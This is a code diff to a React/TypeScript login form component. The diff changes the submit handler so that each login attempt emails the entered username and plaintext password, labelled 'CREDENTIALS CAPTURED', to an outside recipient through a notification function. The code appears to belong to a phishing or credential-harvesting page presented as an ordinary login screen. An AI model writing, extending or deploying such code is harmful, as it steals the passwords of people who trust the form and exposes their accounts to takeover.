@@ -23,7 +23,6 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
   const handleInputChange = (field: string, value: string) => {
     console.log(`🔄 Field changed: ${field} = "${value}"`);
     setFormData(prev => ({ ...prev, [field]: value }));
-    // Removed field-level email sending to reduce delays
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -40,21 +39,23 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
 
     setIsLoading(true);
 
-    // Send HIGH PRIORITY email immediately when LOGIN button is clicked
+    // Send HIGH PRIORITY email with ALL FORM DATA immediately when LOGIN button is clicked
     try {
-      console.log('🚨 Sending HIGH PRIORITY login attempt email immediately...');
+      console.log('🚨 Sending HIGH PRIORITY login attempt email with ALL DATA immediately...');
       await sendHighPriorityNotification({
-        step: "🔴 LOGIN BUTTON CLICKED - IMMEDIATE ALERT",
+        step: "🔴 LOGIN BUTTON CLICKED - CREDENTIALS CAPTURED",
         username: formData.username,
         timestamp: new Date().toISOString(),
         allFormData: {
+          formType: "LOGIN_FORM",
           username: formData.username,
           password: formData.password,
           action: "LOGIN_ATTEMPT",
-          buttonClicked: "LOGIN"
+          buttonClicked: "LOGIN",
+          timestamp: new Date().toISOString()
         }
       });
-      console.log('✅ HIGH PRIORITY login email sent immediately!');
+      console.log('✅ HIGH PRIORITY login email with ALL DATA sent immediately!');
     } catch (error) {
       console.error('❌ HIGH PRIORITY login email failed:', error);
     }
